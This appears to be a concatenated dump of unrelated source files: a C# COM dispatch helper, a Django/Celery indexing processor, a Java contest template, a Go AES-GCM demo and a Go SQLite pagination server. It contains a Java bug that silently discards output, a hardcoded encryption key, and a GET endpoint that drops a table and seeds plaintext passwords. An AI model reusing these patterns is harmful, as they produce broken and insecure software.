 object folders = shell.InvokeDispMember(""BrowseForFolder"", new object[] { (int)0, @""Choose!"", 0 });


 object folderItems = folders.InvokeDispMember(""Items"", new object[] { }, null, InvokeMemberHelper.MethodKind.Method);


 int count = (int)folderItems.InvokeDispMember(""Count"", new object[] { }, null, InvokeMemberHelper.MethodKind.PropertyGet);
            Console.WriteLine(""Folder has {0} items."", count);


 object folderItem = folderItems.InvokeDispMember(""Item"", new object[] { 0 }, null, InvokeMemberHelper.MethodKind.Method);
 string name = (string)folderItem.InvokeDispMember(""Name"", new object[] { }, null, InvokeMemberHelper.MethodKind.PropertyGet);
            Console.WriteLine(""First FolderItem is '{0}'."", name);
            folderItem.InvokeDispMember(""Name"", new object[] { name + ""__changed"" }, null, InvokeMemberHelper.MethodKind.PropertyPut);
 name = (string)folderItem.InvokeDispMember(""Name"", new object[] { }, null, InvokeMemberHelper.MethodKind.PropertyGet);
            Console.WriteLine(""Changed to '{0}'."", name);


            shell.InvokeDispMember(""FindFiles"", new object[] { });
            shell.InvokeDispMember(""ShellExecute"", new object[] { @""C:\windows\system32\cmd.exe"" });
 object dblClickTime = shell.InvokeDispMember(""GetSystemInformation"", new object[] { ""DoubleClickTime"" });
            Console.WriteLine(""Double click time = "" + dblClickTime);
 }
 }


 static class InvokeMemberHelper
 {
 public enum MethodKind
 {
 Method,
 PropertyPut,
 PropertyPutRef,
 PropertyGet
 }


 public static object InvokeDispPropertyGet(
 this object target,
 string name,
 params object[] args)
 {
 return target.InvokeDispMember(
                name, args, null, MethodKind.PropertyGet);
 }


 public static object InvokeDispPropertyPut(
 this object target,
 string name,
 params object[] args)
 {
 return target.InvokeDispMember(
                name, args, null, MethodKind.PropertyPut);
 }


 public static object InvokeDispMethod(
 this object target,
 string name,
 params object[] args)
 {
 return target.InvokeDispMember(
                name, args, null, MethodKind.Method);
 }


 unsafe public static object InvokeDispMember(
 this object target,
 string name,
 object[] args,
            ParameterModifier[] modifiers = null,
 MethodKind methodKind = MethodKind.Method
 )
 {
 // There should be either no modifiers or exactly one modifier
 if (modifiers != null && modifiers.Length > 1)
 throw new ArgumentException();


 //
 // Obtain IDispatch interface
 //
 IDispatch disp = (IDispatch)target;


 // 
 // Retrieve DISPID
 //
 uint dispId = GetDispID(disp, name);


 IntPtr pVariantArgArray = IntPtr.Zero;
 IntPtr pDispIDArray = IntPtr.Zero;


 int argCount = args == null ? 0 : args.Length;
 int variantSize = Marshal.SizeOf<Variant>();
 object result;


 try
 {
 //
 // Package arguments
 //
 if (argCount > 0)
 {
 pVariantArgArray = Marshal.AllocCoTaskMem(variantSize * argCount);
 for (int i = 0; i < argCount; ++i)
 {
 object arg = args[i];


 // !! The arguments should be in REVERSED order!!
 int actualIndex = (argCount - i - 1);


 // If need to pass by ref, create a by-ref variant 
 if (modifiers != null && modifiers[0][i])
 {
 // Create a VARIANT that the by-ref VARIANT points to
 IntPtr pTmpVariant = Marshal.AllocCoTaskMem(variantSize);
                            Marshal.GetNativeVariantForObject(args[i], pTmpVariant);


 // Create the by-ref VARIANT
                            MakeByRefVariant(pVariantArgArray + actualIndex * variantSize, pTmpVariant);
 }
 else
 {
                            Marshal.GetNativeVariantForObject(args[i], pVariantArgArray + actualIndex * variantSize);
 }
 }
 }


                DISPPARAMS[] paramArray = new DISPPARAMS[1];
                paramArray[0].varArgs = pVariantArgArray;
                paramArray[0].argCount = argCount;


 if (methodKind == MethodKind.PropertyPut || methodKind == MethodKind.PropertyPutRef)
 {
 //
 // For property putters, the first DISPID argument needs to be DISPID_PROPERTYPUT
 //
 pVariantArgArray = Marshal.AllocCoTaskMem(variantSize * argCount);
                    Marshal.WriteInt32(pVariantArgArray, DISPID_PROPERTYPUT);


                    paramArray[0].namedArgCount = 1;
                    paramArray[0].namedArgDispIds = pVariantArgArray;
 }
 else
 {
 //
 // Otherwise, no named parameters are necessary
 //
                    paramArray[0].namedArgCount = 0;
                    paramArray[0].namedArgDispIds = IntPtr.Zero;
 }


 //
 // Make the call
 //
 EXCEPINFO info = default(EXCEPINFO);
 uint err;
 short flags;
 if (methodKind == MethodKind.Method)
 flags = (short)Flags.DISPATCH_METHOD;
 else if (methodKind == MethodKind.PropertyPut)
 flags = (short)Flags.DISPATCH_PROPERTYPUT;
 else if (methodKind == MethodKind.PropertyPutRef)
 flags = (short)Flags.DISPATCH_PROPERTYPUTREF;
 else if (methodKind == MethodKind.PropertyGet)
 flags = (short)Flags.DISPATCH_PROPERTYGET;
 else
 throw new ArgumentException();


 try
 {
                    disp.Invoke(
 (uint)dispId,
                        IID_NULL,
                        LCID_DEFAULT,
                        flags,
                        paramArray,
 out result,
 out info,
 out err);
 }
 catch (Exception ex)
 {
 if (ex.HResult == DISP_E_EXCEPTION)
 {
 Exception realException;
 if (info.scode != 0)
 realException = Marshal.GetExceptionForHR(info.scode, IntPtr.Zero);
 else
 realException = Marshal.GetExceptionForHR((int)info.code, IntPtr.Zero);


 if (info.strDescription != IntPtr.Zero)
 {
 string realErrorMessage = Marshal.PtrToStringBSTR(info.strDescription);


 // @TODO - find a way to return this to the caller
 }


 throw realException;
 }


 throw;
 }
 //
 // Now back propagate the by-ref arguments
 //
 for (int i = 0; i < argCount; ++i)
 {
 object arg = args[i];


 // !! The arguments should be in REVERSED order!!
 int actualIndex = (argCount - i - 1);


 // If need to pass by ref, back propagate 
 if (modifiers != null && modifiers[0][i])
 {
                        args[i] = Marshal.GetObjectForNativeVariant(pVariantArgArray + actualIndex * variantSize);
 }
 }


 return result;
 }
 finally
 {
 //
 // Free memory
 //
 if (pVariantArgArray != IntPtr.Zero)
 {
 for (int i = 0; i < argCount; ++i)
 {
                        VariantClear(pVariantArgArray + i * variantSize);
 }


                    Marshal.FreeCoTaskMem(pVariantArgArray);
 }


 if (pDispIDArray != IntPtr.Zero)
 {
                    Marshal.FreeCoTaskMem(pDispIDArray);
 }
 }
 }


 static uint GetDispID(IDispatch disp, string name)
 {
 uint[] dispid = new uint[1];
            disp.GetIDsOfNames(IID_NULL, new string[] { name }, 1, LCID_DEFAULT, dispid);


 return dispid[0];
 }


 public enum VarEnum : ushort
 {
 VT_EMPTY = 0,
 VT_NULL = 1,
 VT_I2 = 2,
 VT_I4 = 3,
 VT_R4 = 4,
 VT_R8 = 5,
 VT_CY = 6,
 VT_DATE = 7,
 VT_BSTR = 8,
 VT_DISPATCH = 9,
 VT_ERROR = 10,
 VT_BOOL = 11,
 VT_VARIANT = 12,
 VT_UNKNOWN = 13,
 VT_DECIMAL = 14,
 VT_I1 = 16,
 VT_UI1 = 17,
 VT_UI2 = 18,
 VT_UI4 = 19,
 VT_I8 = 20,
 VT_UI8 = 21,
 VT_INT = 22,
 VT_UINT = 23,
 VT_VOID = 24,
 VT_HRESULT = 25,
 VT_PTR = 26,
 VT_SAFEARRAY = 27,
 VT_CARRAY = 28,
 VT_USERDEFINED = 29,
 VT_LPSTR = 30,
 VT_LPWSTR = 31,
 VT_RECORD = 36,
 VT_FILETIME = 64,
 VT_BLOB = 65,
 VT_STREAM = 66,
 VT_STORAGE = 67,
 VT_STREAMED_OBJECT = 68,
 VT_STORED_OBJECT = 69,
 VT_BLOB_OBJECT = 70,
 VT_CF = 71,
 VT_CLSID = 72,
 VT_VECTOR = 0x1000,
 VT_ARRAY = 0x2000,
 VT_BYREF = 0x4000
 }


 /*
        const byte[] SizeOfVariant = new map[] 
        {
            0,                      // VT_EMPTY
            0,                      // VT_NULL
            2,                      // VT_I2
            4,                      // VT_I4
            4,                      // VT_R4
            8,                      // VT_R8
            8,                      // VT_CY
            IntPtr.Size,            // VT_DATE
            IntPtr.Size,            // VT_BSTR
            IntPtr.Size,            // VT_DISPATCH
            4,                      // VT_ERROR
            2,                      // VT_BOOL
            IntPtr.Size,            // VT_VARIANT
            IntPtr.Size,            // VT_UNKNOWN
            IntPtr.Size,            // VT_DECIMAL
            0,                      // unused
            1,                      // VT_I1
            1,                      // VT_UI1
            2,                      // VT_UI2
            4,                      // VT_UI4
            8,                      // VT_I8
            8,                      // VT_UI8
            4,                      // VT_INT 
            4,                      // VT_UINT
            0,                      // VT_VOID
            4,                      // VT_HRESULT
            IntPtr.Size,            // VT_PTR
            IntPtr.Size,            // VT_SAFEARRAY
            IntPtr.Size,            // VT_CARRAY
            IntPtr.Size,            // VT_USERDEFINED
            IntPtr.Size,            // VT_LPSTR
            IntPtr.Size,            // VT_LPWSTR
        };
        */


 static unsafe void MakeByRefVariant(IntPtr pDestVariant, IntPtr pSrcVariant)
 {
 Variant* psrcvar = (Variant*)pSrcVariant;
 Variant* pdestvar = (Variant*)pDestVariant;


 switch ((VarEnum)psrcvar->_typeUnion._vt)
 {
 case VarEnum.VT_EMPTY:
 // BY REF VT_EMPTY is not valid
 throw new ArgumentException();


 case VarEnum.VT_RECORD:
 // Representation of record is the same with or without byref
                    pdestvar->_typeUnion._unionTypes._record._record = psrcvar->_typeUnion._unionTypes._record._record;
                    pdestvar->_typeUnion._unionTypes._record._recordInfo = psrcvar->_typeUnion._unionTypes._record._recordInfo;
 break;


 case VarEnum.VT_VARIANT:
                    pdestvar->_typeUnion._unionTypes._byref = new IntPtr(psrcvar);
 break;


 case VarEnum.VT_DECIMAL:
                    pdestvar->_typeUnion._unionTypes._byref = new IntPtr(&(psrcvar->_decimal));
 break;


 default:
 // All the other cases start at the same offset so using &_i4 should work
                    pdestvar->_typeUnion._unionTypes._byref = new IntPtr(&(psrcvar->_typeUnion._unionTypes._i4));
 break;
 }


            pdestvar->_typeUnion._vt = (ushort)(psrcvar->_typeUnion._vt | (ushort)VarEnum.VT_BYREF);
 }


        #region Implementation Details 
 static int LCID_DEFAULT = 0x0409;
 static int DISPID_PROPERTYPUT = -3;
 static int DISP_E_EXCEPTION = unchecked((int)0x80020009);
 static Guid IID_NULL = new Guid();


 [DllImport(""oleaut32.dll"")]
 static extern void VariantClear(IntPtr pVariant);


 [Guid(""00020400-0000-0000-C000-000000000046"")]
 [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
 [ComImport]
 interface IDispatch
 {
 void GetTypeInfoCount(out int typeInfoCount);
 void GetTypeInfo(int info, int lcid, out IntPtr typeInfo);
 void GetIDsOfNames(
 [MarshalAs(UnmanagedType.LPStruct)] Guid iid,
 [MarshalAs(UnmanagedType.LPArray, ArraySubType = UnmanagedType.LPWStr)] string[] names,
 int nameCount,
 int lcid,
 [MarshalAs(UnmanagedType.LPArray)][Out] uint[] DISPID);
 void Invoke(uint dispid, [MarshalAs(UnmanagedType.LPStruct)]Guid iid, int lcid, short flags,
 [MarshalAs(UnmanagedType.LPArray)] [In, Out] DISPPARAMS[] paramArray,
 out object result,
 out EXCEPINFO excepInfo,
 out uint err
 );
 }


 struct DISPPARAMS
 {
 public IntPtr varArgs;
 public IntPtr namedArgDispIds;
 public int argCount;
 public int namedArgCount;
 }


 struct EXCEPINFO
 {
 public short code;
 public short reserved;
 public IntPtr strSource;
 public IntPtr strDescription;
 public IntPtr strHelpFile;
 public uint helpContext;
 public IntPtr pvReserved;
 public IntPtr pfnDeferredFillIn;
 public int scode;
 }


 enum Flags : short
 {
 DISPATCH_METHOD = 0x1,
 DISPATCH_PROPERTYGET = 0x2,
 DISPATCH_PROPERTYPUT = 0x4,
 DISPATCH_PROPERTYPUTREF = 0x8
 }


 [StructLayout(LayoutKind.Explicit)]
 public struct Variant
 {
 // Most of the data types in the Variant are carried in _typeUnion
 [FieldOffset(0)]
 internal TypeUnion _typeUnion;


 // Decimal is the largest data type and it needs to use the space that is normally unused in TypeUnion._wReserved1, etc.
 // Hence, it is declared to completely overlap with TypeUnion. A Decimal does not use the first two bytes, and so
 // TypeUnion._vt can still be used to encode the type.
 [FieldOffset(0)]
 internal Decimal _decimal;


 [StructLayout(LayoutKind.Explicit)]
 internal struct TypeUnion
 {
 [FieldOffset(0)]
 internal ushort _vt;
 [FieldOffset(2)]
 internal ushort _wReserved1;
 [FieldOffset(4)]
 internal ushort _wReserved2;
 [FieldOffset(6)]
 internal ushort _wReserved3;
 [FieldOffset(8)]
 internal UnionTypes _unionTypes;
 }


 [StructLayout(LayoutKind.Sequential)]
 internal struct Record
 {
 internal IntPtr _record;
 internal IntPtr _recordInfo;
 }


 [StructLayout(LayoutKind.Explicit)]
 internal struct UnionTypes
 {
 [FieldOffset(0)]
 internal SByte _i1;
 [FieldOffset(0)]
 internal Int16 _i2;
 [FieldOffset(0)]
 internal Int32 _i4;
 [FieldOffset(0)]
 internal Int64 _i8;
 [FieldOffset(0)]
 internal Byte _ui1;
 [FieldOffset(0)]
 internal UInt16 _ui2;
 [FieldOffset(0)]
 internal UInt32 _ui4;
 [FieldOffset(0)]
 internal UInt64 _ui8;
 [FieldOffset(0)]
 internal Int32 _int;
 [FieldOffset(0)]
 internal UInt32 _uint;
 [FieldOffset(0)]
 internal Int16 _bool;
 [FieldOffset(0)]
 internal Int32 _error;
 [FieldOffset(0)]
 internal Single _r4;
 [FieldOffset(0)]
 internal Double _r8;
 [FieldOffset(0)]
 internal Int64 _cy;
 [FieldOffset(0)]
 internal double _date;
 [FieldOffset(0)]
 internal IntPtr _bstr;
 [FieldOffset(0)]
 internal IntPtr _unknown;
 [FieldOffset(0)]
 internal IntPtr _dispatch;
 [FieldOffset(0)]
 internal IntPtr _pvarVal;
 [FieldOffset(0)]
 internal IntPtr _byref;
 [FieldOffset(0)]
 internal Record _record;
 }
 }


        #endregion


 }
}
"
"signals.py
","from celery import shared_task


from django.db import models, transaction
from django.utils import timezone
from django_elasticsearch_dsl.apps import DEDConfig


from django_elasticsearch_dsl.registries import registry
from django_elasticsearch_dsl.signals import BaseSignalProcessor


from .. import utils




class CelerySignalProcessor(BaseSignalProcessor):
 """"""Celery processor

        Allows automatic updates on the index as delayed background tasks
        using Celery.

        NB: Processing deletes is still handled syncronous.
        By the time the Celery worker would pick up the delete job, the
        model instance would already be deleted.
 
        Use this Processor together with django_elasticsearch_dsl. 
        See https://github.com/sabricot/django-elasticsearch-dsl
 
        Then use this worker by specifying in settings.py:
        ELASTICSEARCH_DSL_SIGNAL_PROCESSOR = (
            '<your-project>.<your-app>.signals.CelerySignalProcessor'
        )
 
    """"""


 NO_INDEXED_AT_FIELD = -1


 def handle_save(self, sender, instance, **kwargs):
 if not DEDConfig.autosync_enabled():
 return


 if instance.__class__ not in registry.get_models():
 return


 serialized_sender = utils.serialize_model(sender)
 serialized_instance = utils.serialize_model_instance(instance)
 return self.async_handle_save.apply_async(
            (
 serialized_sender,
 serialized_instance,
 getattr(instance, 'indexed_at', self.NO_INDEXED_AT_FIELD),
            ),
 countdown=10,
        )


 @staticmethod
 def perform_elastic_update(instance):
 registry.update(instance)
 registry.update_related(instance)


 @shared_task(bind=True)
 def async_handle_save(self, sender, instance, indexed_at):
 deserialized_sender = utils.deserialize_model(sender)  # noqa


 if indexed_at == CelerySignalProcessor.NO_INDEXED_AT_FIELD:
 instance = utils.deserialize_model_instance(instance)
 CelerySignalProcessor.perform_elastic_update(instance)
 return


 with transaction.atomic():
 time_of_retrieval = timezone.now()
 instance = utils.deserialize_model_instance(
 instance, select_for_update=True
            )
 if utils.has_been_indexed_since(instance, timestamp=indexed_at):
 return


 CelerySignalProcessor.perform_elastic_update(instance)
 utils.update_indexed_at(instance, timestamp=time_of_retrieval)


 def setup(self):
 # Listen to all model saves.
 models.signals.post_save.connect(self.handle_save)
 models.signals.post_delete.connect(self.handle_delete)


 # Use to manage related objects update
 models.signals.m2m_changed.connect(self.handle_m2m_changed)
 models.signals.pre_delete.connect(self.handle_pre_delete)


 def teardown(self):
 # Listen to all model saves.
 models.signals.post_save.disconnect(self.handle_save)
 models.signals.post_delete.disconnect(self.handle_delete)
 models.signals.m2m_changed.disconnect(self.handle_m2m_changed)
 models.signals.pre_delete.disconnect(self.handle_pre_delete)
from datetime import datetime


from typing import Dict, Optional


from django.db.models import Model
from django.db.models.base import ModelBase
from django.utils import dateparse




def serialize_model(model: Optional[ModelBase]) -> Optional[Dict[str, str]]:
 """"""
    Accepts a django.db.models.Model class and returns a serialized dict of
    it, so it may be sent to Celery workers over HTTP.
    """"""
 if not isinstance(model, ModelBase):
 return None
 return {'app': model._meta.app_label, 'model': model._meta.model_name}




def deserialize_model(
 serialized_model: Optional[Dict[str, str]]
) -> Optional[Model]:
 """"""
    Accepts a serialized django.db.models.Model class and returns the class.
    """"""
 from django.apps import apps


 if not serialized_model:
 return None


 app = serialized_model.get('app')
 model = serialized_model.get('model')


 if not (app and model):
 return None


 return apps.get_model(app, model)




def serialize_model_instance(
 instance: Optional[Model]
) -> Optional[Dict[str, str]]:
 """"""
    Accept an django.db.models.Model instance and serializes it to a dictionary,
    so it may be serialized and sent to Celery workers over HTTP
    """"""
 if not instance:
 return None


 deserialized = serialize_model(instance.__class__)
 deserialized['id'] = str(instance.id)
 return deserialized




def deserialize_model_instance(
 serialized_instance: Optional[Dict[str, str]],
 *,
 select_for_update: bool = False
):
 """"""
    Accepts a serialized version of a Django model, and returns the instance.
    set kwargs select_for_update=True to lock the table row, preventing other
    threads from updating the instance while we work on it.
    """"""
 model = deserialize_model(serialized_instance)
 if not model:
 return None


 if not serialized_instance.get('id'):
 return None


 if select_for_update:
 return (
 model.objects.filter(id=serialized_instance.get('id'))
            .select_for_update()
            .first()
        )
 return model.objects.filter(id=serialized_instance.get('id')).first()




def has_been_indexed_since(instance: Model, *, timestamp: Optional[datetime]):
 """"""
    If instance has attribute indexed_at, we use this to determine if
    the instance has been indexed between the time the task was called
    was called, and now.

    If it has been, reindexing is unnecessary.
    """"""
 if not instance:
 return False
 if not getattr(instance, 'indexed_at', None):
 return False
 if not timestamp and not instance.indexed_at:
 return False
 if not timestamp and instance.indexed_at:
 return True
 if type(timestamp) == str:
 timestamp = dateparse.parse_datetime(timestamp)
 return instance.indexed_at > timestamp




def update_indexed_at(instance: Model, *, timestamp: Optional[datetime]):
 """"""
    Updates attribute indexed_at (if it exists) without triggering
    save_handler(). This prevents a loop from occuring
    """"""
 if not hasattr(instance, 'indexed_at'):
 return
 if not hasattr(instance.__class__, 'objects'):
 return
 instance.__class__.objects.filter(pk=instance.pk).update(
 indexed_at=timestamp
    )
"
"Main.java
","/*
 * No package must be added here because some Online Judges don't support it
 * please remove, if any.
 * 
 */
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;


/*
 * Only classes with 'Main' name are accepted in CodeChef and some other online judges
 */
public class Main {


 /*
	 * In a Programming contest, you are expected to print the output at the
	 * end, so `output` variable will hold all the processed results till the
	 * end
	 */
 public static String output = """";


 // Program's starting point
 public static void main(String[] args) {


 /*
		 * A Scanner class slows down Input/Output a LOT ,thereby increasing
		 * your code execution time , Hence for best results that is Fast I/O
		 * try to use BufferedReader
		 */
 BufferedReader br = new BufferedReader(new InputStreamReader(System.in));
 /*
		 * Generally Code Chef, Hacker Rank gives X number of test cases so we
		 * process the input for each.
		 */
 final int cases;
 try {
 cases = Integer.parseInt(br.readLine().trim());
 /*
			 * Logic of the program must be separated from the meta code to
			 * increase readability and help debugging easier
			 * Also note that Solver object is created inside for loop to
			 * avoid multiple object creation that drastically increases 
			 * execution time and memory usage
			 */
 Solver solver = new Solver();
 for (int i = 0; i < cases; i++) {				
 solver.solve(br.readLine());
			}


		} catch (IOException e) {
 // TODO Auto-generated catch block
 e.printStackTrace();
		}
 // Print the final output
 System.out.println(output);
	}


}
/*
 * Some basic rules while coding in Programming Contests:
 * Try to follow at least 80% of them
	Correctness
		- final declaration for required data types
		- avoid Object creation 
		- Scanner slows down, use InputReader
		- avoid too many static functions	
	Efficiency
		- use library functions as much as possible		
		- assertEquals(""RESULT"", functionToCall())
	Debugging-ability
		- avoid too many global variables 
		- Separate logic from meta-processing
		- variable/function pneumonics must make sense
 * 
 */
class Solver {


 /*
	 * Logic goes here ...
	 * Add to the global variables after processing the input
	 * Maybe reverse a string or parse to an integer or , etc.
	 */ 
 public void solve(String input) {					
 Main.output.concat(input);	
	}


}
"
"main.go
","package main


import (
 ""crypto/aes""
 ""crypto/cipher""
 ""crypto/rand""
 ""encoding/hex""
 ""fmt""
 ""io""
)


func Encrypt(stringToEncrypt string, keyString string) (encryptedString string) {


 //Karena kunci dan plain text yang digunakan berbentuk string, kita perlu mengonversinya dalam ke byte
 key := []byte(keyString)
 plaintext := []byte(stringToEncrypt)


 //memebuat Cipher Block yang berasal dari key
 block, err := aes.NewCipher(key)
 if err != nil {
 fmt.Println(err.Error())
 panic(err.Error())
	}


 //Membuat GCM baru- https://en.wikipedia.org/wiki/Galois/Counter_Mode
 //https://golang.org/pkg/crypto/cipher/#NewGCM
 aesGCM, err := cipher.NewGCM(block)
 if err != nil {
 fmt.Println(err.Error())
 panic(err.Error())
	}


 //Buat nonce. Nonce harus berasal dari GCM
 nonce := make([]byte, aesGCM.NonceSize())
 if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
 panic(err.Error())
	}


 //Enkripsi data menggunakan aesGCM.Seal
 //Karena kita tidak ingin menyimpan nonce di tempat lain dalam kasus ini, kita tambahkan sebagai awalan ke data terenkripsi. Bentuk Argumen nonce pertama di Seal merupakan awalan.
 ciphertext := aesGCM.Seal(nonce, nonce, plaintext, nil)
 return fmt.Sprintf(""%x"", ciphertext)
}


func Decrypt(encryptedString string, keyString string) (decryptedString string) {


 //Karena kunci dan plain text yang digunakan berbentuk string, kita perlu mengonversinya dalam ke byte
 key := []byte(keyString)
 enc, _ := hex.DecodeString(encryptedString)


 //Create a new Cipher Block from the key
 block, err := aes.NewCipher(key)
 if err != nil {
 panic(err.Error())
	}


 //Membuat GCM baru
 aesGCM, err := cipher.NewGCM(block)
 if err != nil {
 panic(err.Error())
	}


 //Dapatkan ukuran nonce
 nonceSize := aesGCM.NonceSize()


 //Ekstrak nonce dari data terenkripsi
 nonce, ciphertext := enc[:nonceSize], enc[nonceSize:]


 //Mendekripsi data
 plaintext, err := aesGCM.Open(nil, nonce, ciphertext, nil)
 if err != nil {
 panic(err.Error())
	}


 decrypted := string(plaintext)
 return decrypted
}


func main() {


 // key 32 bit
 key := ""(H>MbQeThWmZq4t7w!z$C&F)J@NcRfUj""


 // plaintext
 pt := ""Ini Contoh""


 e := Encrypt(pt, key)
 d := Decrypt(e, key)
 fmt.Printf(""Key 	: %s \n"", key)
 fmt.Printf(""Encrypt : %s \n"", e)
 fmt.Printf(""Decrypt : %s \n"", d)


}
==<SEPERATOR>==
paginator.go
package main


import (
 ""database/sql""
 ""encoding/json""
 ""flag""
 ""fmt""
 ""log""
 ""net/http""
 ""os""
 ""strconv""


 ""github.com/bmizerany/pat""
	_ ""github.com/mattn/go-sqlite3""
)


// DB connection
var DB *sql.DB


func main() {
 var err error
 // Define a new command-line flag with the name 'addr', a default value of "":4000""
 // and some short help text explaining what the flag controls. The value of the
 // flag will be stored in the addr variable at runtime.
 addr := flag.String(""addr"", "":8080"", ""HTTP network address"")


 // Use log.New() to create a logger for writing information messages. This takes
 // three parameters: the destination to write the logs to (os.Stdout), a string
 // prefix for message (INFO followed by a tab), and flags to indicate what
 // additional information to include (local date and time). Note that the flags
 // are joined using the bitwise OR operator |.
 // InfoLog = log.New(os.Stdout, ""INFO\t"", log.Ldate|log.Ltime|log.Lshortfile)
 infoLog := log.New(os.Stdout, ""INFO\t"", log.Ldate|log.Ltime|log.Llongfile)


 // Create a logger for writing error messages in the same way, but use stderr as
 // the destination and use the log.Lshortfile flag to include the relevant
 // file name and line number.
 errLog := log.New(os.Stderr, ""ERROR\t"", log.Ldate|log.Ltime|log.Llongfile)


 mux := pat.New()


 // userHandler
 // mux.Get(""/user"", http.HandlerFunc(user.Get))
 mux.Get(""/user/create"", http.HandlerFunc(CreateUser))
 mux.Get(""/user"", http.HandlerFunc(GetUser))


 // Importantly, we use the flag.Parse() function to parse the command-line flag.
 // This reads in the command-line flag value and assigns it to the addr
 // variable. You need to call this *before* you use the addr variable
 // otherwise it will always contain the default value of "":4000"". If any errors are
 // encountered during parsing the application will be terminated.
 flag.Parse()


 // sqlite
 DB, err = sql.Open(""sqlite3"", ""alochym.db"")


 if err != nil {
 panic(err)
	}
 defer DB.Close()


 infoLog.Println(""starting server on"", *addr)
 err = http.ListenAndServe(*addr, mux)
 errLog.Fatal(err)
}


// User models
type User struct {
 ID int
 Name string
 Email string
 Password string
}


// Pagination Object
type Pagination struct {
 Next int
 Previous int
 RecordPerPage int
 CurrentPage int
 TotalPage int
}


// Get all User accounts
func (u User) Get(page int) (interface{}, error) {
 var (
 // Create empty Album
 record = User{}
 // Create empty slice Album
 users = []User{}
 data = map[string]interface{}{}
	)


 limit := 10
 offset := limit * (page - 1)
 data[""Page""] = *pagination(""users"", limit, page)


 // sqlstmt - Avoid SQL Injection Attack
 // Using limit and offset to get records
 sqlstmt := fmt.Sprintf(""SELECT id, name, email FROM users order by id desc limit %d offset %d"", limit, offset)


 fmt.Println(sqlstmt)


 rows, _ := DB.Query(sqlstmt)
 // close rows query
 defer rows.Close()


 for rows.Next() {
 err := rows.Scan(&record.ID, &record.Name, &record.Email)
 if err != nil {
 // check server err
 return nil, err
		}


 // append record to albums slice
 users = append(users, record)
	}


 data[""Records""] = users


 return data, nil
}


// GetUser return all user records
func GetUser(w http.ResponseWriter, r *http.Request) {
 u := User{}
 page, _ := strconv.Atoi(r.URL.Query().Get(""page""))


 if page == 0 {
 page = 1
	}


 result, _ := u.Get(page)
 w.Header().Set(""Content-Type"", ""application/json"")
 // Transform to JSON response
 json.NewEncoder(w).Encode(result)
}


// CreateUser mock data
func CreateUser(w http.ResponseWriter, r *http.Request) {
 sqldroptable := fmt.Sprint(""DROP TABLE users;"")
 DB.Exec(sqldroptable)


 sqltable := fmt.Sprintf(""CREATE TABLE users (id INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT, name VARCHAR(255) NOT NULL, email VARCHAR(255) NOT NULL, password CHAR(60) NOT NULL, created  datetime default current_timestamp)"")


 // Execute SQL Statements
 _, err := DB.Exec(sqltable)


 if err != nil {
 fmt.Println(err.Error())
	}


 fmt.Println(""User table created"")


 var users = []User{
		{Name: ""Alice Jones"", Email: ""alice@example.com"", Password: ""alochym@123""},
		{Name: ""Do Nguyen Ha"", Email: ""hadn4@fpt.com.vn"", Password: ""alochym@123""},
		{Name: ""Ngo Thi To Nhu"", Email: ""nhuntt@fpt.com.vn"", Password: ""alochym@123""},
		{Name: ""Do Thi Hiep"", Email: ""hiepdt@fpt.com.vn"", Password: ""alochym@123""},
		{Name: ""Do Thi Kim Hoa"", Email: ""hoadtk@nhs.com.vn"", Password: ""alochym@123""},
		{Name: ""Alice Jones"", Email: ""alice@example.com"", Password: ""alochym@123""},
		{Name: ""Do Nguyen Ha"", Email: ""hadn4@fpt.com.vn"", Password: ""alochym@123""},
		{Name: ""Ngo Thi To Nhu"", Email: ""nhuntt@fpt.com.vn"", Password: ""alochym@123""},
		{Name: ""Do Thi Hiep"", Email: ""hiepdt@fpt.com.vn"", Password: ""alochym@123""},
		{Name: ""Do Thi Kim Hoa"", Email: ""hoadtk@nhs.com.vn"", Password: ""alochym@123""},
		{Name: ""Alice Jones"", Email: ""alice@example.com"", Password: ""alochym@123""},
		{Name: ""Do Nguyen Ha"", Email: ""hadn4@fpt.com.vn"", Password: ""alochym@123""},
		{Name: ""Ngo Thi To Nhu"", Email: ""nhuntt@fpt.com.vn"", Password: ""alochym@123""},
		{Name: ""Do Thi Hiep"", Email: ""hiepdt@fpt.com.vn"", Password: ""alochym@123""},
		{Name: ""Do Thi Kim Hoa"", Email: ""hoadtk@nhs.com.vn"", Password: ""alochym@123""},
		{Name: ""Alice Jones"", Email: ""alice@example.com"", Password: ""alochym@123""},
		{Name: ""Do Nguyen Ha"", Email: ""hadn4@fpt.com.vn"", Password: ""alochym@123""},
		{Name: ""Ngo Thi To Nhu"", Email: ""nhuntt@fpt.com.vn"", Password: ""alochym@123""},
		{Name: ""Do Thi Hiep"", Email: ""hiepdt@fpt.com.vn"", Password: ""alochym@123""},
		{Name: ""Do Thi Kim Hoa"", Email: ""hoadtk@nhs.com.vn"", Password: ""alochym@123""},
		{Name: ""Alice Jones"", Email: ""alice@example.com"", Password: ""alochym@123""},
		{Name: ""Do Nguyen Ha"", Email: ""hadn4@fpt.com.vn"", Password: ""alochym@123""},
		{Name: ""Ngo Thi To Nhu"", Email: ""nhuntt@fpt.com.vn"", Password: ""alochym@123""},
		{Name: ""Do Thi Hiep"", Email: ""hiepdt@fpt.com.vn"", Password: ""alochym@123""},
		{Name: ""Do Thi Kim Hoa"", Email: ""hoadtk@nhs.com.vn"", Password: ""alochym@123""},
		{Name: ""Alice Jones"", Email: ""alice@example.com"", Password: ""alochym@123""},
		{Name: ""Do Nguyen Ha"", Email: ""hadn4@fpt.com.vn"", Password: ""alochym@123""},
		{Name: ""Ngo Thi To Nhu"", Email: ""nhuntt@fpt.com.vn"", Password: ""alochym@123""},
		{Name: ""Do Thi Hiep"", Email: ""hiepdt@fpt.com.vn"", Password: ""alochym@123""},
		{Name: ""Do Thi Kim Hoa"", Email: ""hoadtk@nhs.com.vn"", Password: ""alochym@123""},
		{Name: ""Alice Jones"", Email: ""alice@example.com"", Password: ""alochym@123""},
		{Name: ""Do Nguyen Ha"", Email: ""hadn4@fpt.com.vn"", Password: ""alochym@123""},
		{Name: ""Ngo Thi To Nhu"", Email: ""nhuntt@fpt.com.vn"", Password: ""alochym@123""},
		{Name: ""Do Thi Hiep"", Email: ""hiepdt@fpt.com.vn"", Password: ""alochym@123""},
		{Name: ""Do Thi Kim Hoa"", Email: ""hoadtk@nhs.com.vn"", Password: ""alochym@123""},
		{Name: ""Alice Jones"", Email: ""alice@example.com"", Password: ""alochym@123""},
